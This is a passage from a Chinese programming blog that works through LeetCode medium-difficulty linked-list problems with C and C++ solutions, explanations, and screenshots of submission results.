<span class="keyword">return</span> temp-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0xFF-至此，Leetcode单向链表部分【简单】难度的题目，全部结束"><a href="#0xFF-至此，Leetcode单向链表部分【简单】难度的题目，全部结束" class="headerlink" title="0xFF.至此，Leetcode单向链表部分【简单】难度的题目，全部结束"></a>0xFF.至此，Leetcode单向链表部分【简单】难度的题目，全部结束</h2><p>下面是难度中等的题目</p><h1 id="0x02-难度：中等"><a href="#0x02-难度：中等" class="headerlink" title="0x02.难度：中等"></a>0x02.难度：中等</h1><h2 id="0x00-两数相加"><a href="#0x00-两数相加" class="headerlink" title="0x00.两数相加"></a>0x00.<a href="https://leetcode-cn.com/problems/add-two-numbers" target="_blank" rel="noopener">两数相加</a></h2><blockquote><p>给出两个 非空 的链表用来表示两个非负的整数。其中，它们各自的位数是按照 逆序 的方式存储的，并且它们的每个节点只能存储 一位 数字。</p><p>如果，我们将这两个数相加起来，则会返回一个新的链表来表示它们的和。</p><p>您可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p><p>示例：</p><p>输入：(2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)<br>输出：7 -&gt; 0 -&gt; 8<br>原因：342 + 465 = 807</p><p>来源：力扣（LeetCode） 链接：<a href="https://leetcode-cn.com/problems/add-two-numbers" target="_blank" rel="noopener">https://leetcode-cn.com/problems/add-two-numbers</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p><strong>Talk is cheap. Show me the code.</strong>（<del>其实是因为我懒并且写完也看不懂了</del> ）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct ListNode* <span class="title">addTwoNumbers</span><span class="params">(struct ListNode* l1, struct ListNode* l2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num,num2,pd=<span class="number">0</span>;<span class="comment">//pd为进位标识符</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">temp</span>=(<span class="title">struct</span> <span class="title">ListNode</span>*)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">ListNode</span>));</span></span><br><span class="line">    temp-&gt;val=<span class="number">0</span>;</span><br><span class="line">    temp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">temp2</span>=<span class="title">temp</span>;</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)<span class="comment">//对两个链表进行遍历，模拟整数加减法</span></span><br><span class="line">    &#123;</span><br><span class="line">        num=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(l1==<span class="literal">NULL</span>&amp;&amp;l2==<span class="literal">NULL</span>)<span class="comment">//都遍历完了</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(pd==<span class="number">1</span>)<span class="comment">//进行最后一次计算</span></span><br><span class="line">                ;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(l1==<span class="literal">NULL</span>)<span class="comment">//l1先于l2结束遍历</span></span><br><span class="line">        &#123;</span><br><span class="line">            num=l2-&gt;val;</span><br><span class="line">            l2=l2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(l2==<span class="literal">NULL</span>)<span class="comment">//l2先于l1结束遍历</span></span><br><span class="line">        &#123;</span><br><span class="line">            num=l1-&gt;val;</span><br><span class="line">            l1=l1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span><span class="comment">//常规运算</span></span><br><span class="line">        &#123;</span><br><span class="line">            num=l1-&gt;val+l2-&gt;val;</span><br><span class="line">            l1=l1-&gt;next;</span><br><span class="line">            l2=l2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(pd)<span class="comment">//重置pd</span></span><br><span class="line">        &#123;</span><br><span class="line">            num+=num2;</span><br><span class="line">            pd=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num&gt;<span class="number">9</span>)<span class="comment">//进位</span></span><br><span class="line">        &#123;</span><br><span class="line">            pd=<span class="number">1</span>;</span><br><span class="line">            num2=num/<span class="number">10</span>;</span><br><span class="line">            num%=<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        temp-&gt;val=num;</span><br><span class="line">        <span class="keyword">if</span>(l1==<span class="literal">NULL</span>&amp;&amp;l2==<span class="literal">NULL</span>&amp;&amp;pd==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//分配新的节点进行接续，模拟数组</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">temp3</span>=(<span class="title">struct</span> <span class="title">ListNode</span>*)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">ListNode</span>));</span></span><br><span class="line">        <span class="comment">//节点赋值</span></span><br><span class="line">        temp3-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">        temp-&gt;next=temp3;</span><br><span class="line">        temp=temp3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> temp2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20191105010431651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FydHRuYmEz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x01-删除链表的倒数第n个节点"><a href="#0x01-删除链表的倒数第n个节点" class="headerlink" title="0x01.删除链表的倒数第n个节点"></a>0x01.<a href="https://leetcode-cn.com/problems/remove-nth-node-from-end-of-list/" target="_blank" rel="noopener">删除链表的倒数第n个节点</a></h2><blockquote><p>给定一个链表，删除链表的倒数第 n 个节点，并且返回链表的头结点。</p><p>示例：</p><p>给定一个链表: 1-&gt;2-&gt;3-&gt;4-&gt;5, 和 n = 2.</p><p>当删除了倒数第二个节点后，链表变为 1-&gt;2-&gt;3-&gt;5.<br>说明：</p><p>给定的 n 保证是有效的。</p><p>进阶：</p><p>你能尝试使用一趟扫描实现吗？</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/remove-nth-node-from-end-of-list" target="_blank" rel="noopener">https://leetcode-cn.com/problems/remove-nth-node-from-end-of-list</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><h3 id="解法一：数组储存结点地址"><a href="#解法一：数组储存结点地址" class="headerlink" title="解法一：数组储存结点地址"></a>解法一：数组储存结点地址</h3><p>用一个数组存储每一个节点的地址，我觉得彳亍，<strong>并且完成了进阶解法仅扫描一遍的要求</strong></p><p><strong>但是有个缺点就是不能够应对任意长度的链表的情况</strong></p><blockquote><p>使用C++中的vector容器或许可以解决数组固定长度的问题？</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct ListNode* <span class="title">removeNthFromEnd</span><span class="params">(struct ListNode* head, <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">fptr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">temp</span>[100];</span></span><br><span class="line">fptr=head;</span><br><span class="line"><span class="keyword">if</span>(head==<span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> head;</span><br><span class="line"><span class="keyword">int</span> l_list;</span><br><span class="line"><span class="keyword">for</span>(l_list=<span class="number">0</span>;fptr!=<span class="literal">NULL</span>;l_list++)</span><br><span class="line">&#123;</span><br><span class="line">temp[l_list]=fptr;</span><br><span class="line">fptr=fptr-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(n==l_list)</span><br><span class="line"><span class="keyword">return</span> head-&gt;next;</span><br><span class="line">temp[l_list-n<span class="number">-1</span>]-&gt;next=temp[l_list-n]-&gt;next;</span><br><span class="line"><span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2019110701091458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FydHRuYmEz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="解法二：双指针"><a href="#解法二：双指针" class="headerlink" title="解法二：双指针"></a>解法二：双指针</h3><p>思路同<strong>【简单】0x03</strong>，因为<strong>当遍历到倒数第k个链表时，该结点的下k个结点必定是NULL</strong>，故我们选择使用两个指针来对链表进行同步遍历，<strong>第二个指针初始设置为头结点的下k个结点，当第二个指针的下一个结点为NULL时将第一个指针指向其下一个结点的下一个结点即可</strong></p><p>线性时间复杂度为<strong>O</strong>(<strong>N</strong>)，因为只需要一个额外的指针的空间故空间复杂度为常数空间复杂度<strong>O</strong>(<strong>1</strong>)</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct ListNode* <span class="title">removeNthFromEnd</span><span class="params">(struct ListNode* head, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">ptr</span>, *<span class="title">temp</span>;</span></span><br><span class="line">    temp = ptr = head;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">    <span class="keyword">if</span>(temp == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> head-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(temp-&gt;next == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ptr-&gt;next = ptr-&gt;next-&gt;next;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        ptr = ptr-&gt;next;</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/21/w9PmGToZMvK2FrQ.png" alt="image.png"></p><blockquote><p>时隔十个月后回过来看这道题才想到可以用双指针</p><p>以及从内存消耗上看得出来这道题在这十个月中已经被无数人轮过le（悲</p></blockquote><h2 id="0x02-反转链表II"><a href="#0x02-反转链表II" class="headerlink" title="0x02.反转链表II"></a>0x02.<a href="https://leetcode-cn.com/problems/reverse-linked-list-ii" target="_blank" rel="noopener">反转链表II</a></h2><blockquote><p>反转从位置 m 到 n 的链表。请使用一趟扫描完成反转。</p><p>说明: 1 ≤ m ≤ n ≤ 链表长度。</p><p>示例:</p><p>输入: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, m = 2, n = 4<br>输出: 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;NULL</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/reverse-linked-list-ii" target="_blank" rel="noopener">https://leetcode-cn.com/problems/reverse-linked-list-ii</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>一趟扫描进行完成，说实话属实有点麻烦，并且还指定了要反转的位置…</p><p>等等，制定了要反转的位置？</p><p>那么只要我们在遍历到那个位置的时候进行反转不就好了嘛www</p><p><strong>思路：在需要反转的位置重新构建一条新的反转后的链表，构建结束后将其重新嵌入原来的位置</strong></p><blockquote><p>大致是下面的这样一个流程：</p><p>原始数据： [1,2,3,4,5]    反转位置：2~4</p><p>第一趟循环：1-&gt;2-&gt;3-&gt;4-&gt;5    操作：无</p><p>第二趟循环：1-&gt;3-&gt;2-&gt;4-&gt;5    操作：3-&gt;2, 2-&gt;4, 1-&gt;3</p><p>第三趟循环：1-&gt;4-&gt;3-&gt;2-&gt;5    操作：4-&gt;3, 2-&gt;5, 1-&gt;4</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct ListNode* <span class="title">reverseBetween</span><span class="params">(struct ListNode* head, <span class="keyword">int</span> start, <span class="keyword">int</span> <span class="built_in">end</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(start == <span class="built_in">end</span>)</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">returnNode</span> = <span class="title">head</span>, *<span class="title">ergodic</span> = <span class="title">head</span>, *<span class="title">newHead</span> = <span class="title">head</span>, *<span class="title">temp</span>;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *ergodic： 当前正在遍历的节点</span></span><br><span class="line"><span class="comment">    *temp：  反转前ergodic的下一节点</span></span><br><span class="line"><span class="comment">    *newHead： 反转开始位置的上一节点，若从第一个节点开始反转则恒为第一个节点</span></span><br><span class="line"><span class="comment">    *returnNode： 最后形成的整个链表的第一个节点</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;<span class="built_in">end</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(start &lt;= i)</span><br><span class="line">        &#123;</span><br><span class="line">            temp = ergodic-&gt;next;</span><br><span class="line">            ergodic-&gt;next = temp-&gt;next;</span><br><span class="line">            <span class="keyword">if</span>(start!=<span class="number">1</span>)<span class="comment">//反转从中间开始</span></span><br><span class="line">            &#123;</span><br><span class="line">                temp-&gt;next=newHead-&gt;next;</span><br><span class="line">                newHead-&gt;next = temp;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span><span class="comment">//从头开始反转，需要时刻变更头节点</span></span><br><span class="line">            &#123;</span><br><span class="line">                temp-&gt;next = newHead;</span><br><span class="line">                newHead = returnNode = temp;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            newHead = ergodic;</span><br><span class="line">            ergodic = ergodic-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> returnNode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/23/9QxVj6qZgC7eXpy.png" alt="QQ截图20200423020827.png"></p><h2 id="0x03-二叉树中的列表"><a href="#0x03-二叉树中的列表" class="headerlink" title="0x03.二叉树中的列表"></a>0x03.<a href="https://leetcode-cn.com/problems/linked-list-in-binary-tree/" target="_blank" rel="noopener">二叉树中的列表</a></h2><blockquote><p>给你一棵以 <code>root</code> 为根的二叉树和一个 <code>head</code> 为第一个节点的链表。</p><p>如果在二叉树中，存在一条一直向下的路径，且每个点的数值恰好一一对应以 <code>head</code> 为首的链表中每个节点的值，那么请你返回 <code>True</code>，否则返回 <code>False</code> 。</p><p>一直向下的路径的意思是：从树中某个节点开始，一直连续向下的路径。</p><p>示例 1：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/02/29/sample_1_1720.png" alt=""></p><blockquote><p>输入：head = [4,2,8], root = [1,4,4,null,2,2,null,1,null,6,8,null,null,null,null,1,3]<br>输出：true<br>解释：树中蓝色的节点构成了与链表对应的子路径。</p></blockquote><p>示例 2：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/02/29/sample_2_1720.png" alt=""></p><blockquote><p>输入：head = [1,4,2,6], root = [1,4,4,null,2,2,null,1,null,6,8,null,null,null,null,1,3]<br>输出：true</p></blockquote><p>示例 3：</p><blockquote><p>输入：head = [1,4,2,6,8], root = [1,4,4,null,2,2,null,1,null,6,8,null,null,null,null,1,3]<br>输出：false<br>解释：二叉树中不存在一一对应链表的路径。</p></blockquote><p>提示：</p><p>二叉树和链表中的每个节点的值都满足 1 &lt;= node.val &lt;= 100 。<br>链表包含的节点数目在 1 到 100 之间。<br>二叉树包含的节点数目在 1 到 2500 之间。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/linked-list-in-binary-tree" target="_blank" rel="noopener">https://leetcode-cn.com/problems/linked-list-in-binary-tree</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>这题咋一看很难的样子，其实仔细一想，这不就是我们常用的递归算法中的二叉树的前序遍历🐎，一股熟悉的感觉扑面而来www</p><blockquote><p>前序遍历：先遍历根节点，再遍历左节点，再遍历又节点</p></blockquote><blockquote><p>不熟悉递归算法的可以先看看<a href="https://blog.csdn.net/arttnba3/article/details/102748671" target="_blank" rel="noopener">我以前的博文</a>，然后把<a href="http://noi.openjudge.cn/ch0205/1700/" target="_blank" rel="noopener">OpenJudge.1700:八皇后问题</a>给做了，那么这道题的算法你基本上也就该明白了</p></blockquote><p><strong>思路：递归前序遍历二叉树查找对应的&quot;链表&quot;，找到了直接返回True，遍历完整棵树都没找到则返回False</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">seek</span><span class="params">(struct ListNode* head, struct TreeNode* root)</span><span class="comment">//此函数进行对比</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(head == <span class="literal">NULL</span>)<span class="comment">//链表遍历完了，直接true</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>)<span class="comment">//链表没完树先到头肯定是false</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(head-&gt;val!=root-&gt;val)<span class="comment">//遍历到一半不一样，肯定是false</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">seek</span>(head-&gt;next,root-&gt;left)||<span class="built_in">seek</span>(head-&gt;next,root-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isSubPath</span><span class="params">(struct ListNode* head, struct TreeNode* root)</span><span class="comment">//此函数仅用作开始对比的入口</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">seek</span>(head,root)||isSubPath(head,root-&gt;left)||isSubPath(head,root-&gt;right);<span class="comment">//根节点||左孩子做根节点||右孩子做根节点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/23/xOrMznpe3V6hmJ5.png" alt="QQ截图20200423032409.png"></p><h2 id="0x04-扁平化多级双向链表"><a href="#0x04-扁平化多级双向链表" class="headerlink" title="0x04.扁平化多级双向链表"></a>0x04.<a href="https://leetcode-cn.com/problems/flatten-a-multilevel-doubly-linked-list/" target="_blank" rel="noopener">扁平化多级双向链表</a></h2><blockquote><p>多级双向链表中，除了指向下一个节点和前一个节点指针之外，它还有一个子链表指针，可能指向单独的双向链表。这些子列表也可能会有一个或多个自己的子项，依此类推，生成多级数据结构，如下面的示例所示。</p><p>给你位于列表第一级的头节点，请你扁平化列表，使所有结点出现在单级双链表中。</p><p>示例 1：</p><p>输入：head = [1,2,3,4,5,6,null,null,null,7,8,9,10,null,null,11,12]<br>输出：[1,2,3,7,8,11,12,9,10,4,5,6]<br>解释：</p><p>输入的多级列表如下图所示：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/10/12/multilevellinkedlist.png" alt="image.png"></p><p>扁平化后的链表如下图：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/10/12/multilevellinkedlistflattened.png" alt="image.png"></p><p>示例 2：</p><p>输入：head = [1,2,null,3]<br>输出：[1,3,2]<br>解释：</p><p>输入的多级列表如下图所示：</p><p>  1—2—NULL<br>  |<br>  3—NULL<br>示例 3：</p><p>输入：head = []<br>输出：[]</p><p>如何表示测试用例中的多级链表？</p><p>以 示例 1 为例：</p><p> 1—2—3—4—5—6–NULL<br>         |<br>         7—8—9—10–NULL<br>             |<br>             11–12–NULL<br>序列化其中的每一级之后：</p><p>[1,2,3,4,5,6,null]<br>[7,8,9,10,null]<br>[11,12,null]<br>为了将每一级都序列化到一起，我们需要每一级中添加值为 null 的元素，以表示没有节点连接到上一级的上级节点。</p><p>[1,2,3,4,5,6,null]<br>[null,null,7,8,9,10,null]<br>[null,11,12,null]<br>合并所有序列化结果，并去除末尾的 null 。</p><p>[1,2,3,4,5,6,null,null,null,7,8,9,10,null,null,11,12]</p><p>提示：</p><p>节点数目不超过 1000<br>1 &lt;= Node.val &lt;= 10^5</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/flatten-a-multilevel-doubly-linked-list" target="_blank" rel="noopener">https://leetcode-cn.com/problems/flatten-a-multilevel-doubly-linked-list</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>没有C语言评测，好气啊（呼呼呼</p><h3 id="解法：递归-深度优先搜索（DFS）"><a href="#解法：递归-深度优先搜索（DFS）" class="headerlink" title="解法：递归 + 深度优先搜索（DFS）"></a>解法：递归 + 深度优先搜索（DFS）</h3><p>遍历链表，若有孩子则先扁平化孩子，将该结点下一个结点接到孩子链表尾，该结点接到孩子链表头即可</p><p>使用递归可以很方便地实现</p><p>构造代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// Definition for a Node.</span></span><br><span class="line"><span class="comment">class Node &#123;</span></span><br><span class="line"><span class="comment">public:</span></span><br><span class="line"><span class="comment">    int val;</span></span><br><span class="line"><span class="comment">    Node* prev;</span></span><br><span class="line"><span class="comment">    Node* next;</span></span><br><span class="line"><span class="comment">    Node* child;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function">Node* <span class="title">flatten</span><span class="params">(Node* head)</span> </span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!head)</span><br><span class="line">                <span class="keyword">return</span> head;</span><br><span class="line">            Node * temp = head, *temp2;</span><br><span class="line">            <span class="keyword">while</span>(temp)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(temp-&gt;child)</span><br><span class="line">                &#123;</span><br><span class="line">                    temp2 = temp-&gt;next;</span><br><span class="line">                    temp-&gt;next = flatten(temp-&gt;child);</span><br><span class="line">                    temp-&gt;next-&gt;prev = temp;</span><br><span class="line">                    temp-&gt;child = <span class="literal">nullptr</span>;</span><br><span class="line">                    <span class="keyword">while</span>(temp-&gt;next)</span><br><span class="line">                        temp = temp-&gt;next;</span><br><span class="line">                    temp-&gt;next = temp2;</span><br><span class="line">                    <span class="keyword">if</span>(temp2)</span><br><span class="line">                        temp2-&gt;prev = temp;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    temp = temp-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wX4CGV.png" alt="wX4CGV.png"></p><h2 id="0x05-旋转链表"><a href="#0x05-旋转链表" class="headerlink" title="0x05.旋转链表"></a>0x05.<a href="https://leetcode-cn.com/problems/rotate-list/" target="_blank" rel="noopener">旋转链表</a></h2><blockquote><p>给定一个链表，旋转链表，将链表每个节点向右移动 k 个位置，其中 k 是非负数。</p><p>示例 1:</p><p>输入: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, k = 2<br>输出: 4-&gt;5-&gt;1-&gt;2-&gt;3-&gt;NULL<br>解释:<br>向右旋转 1 步: 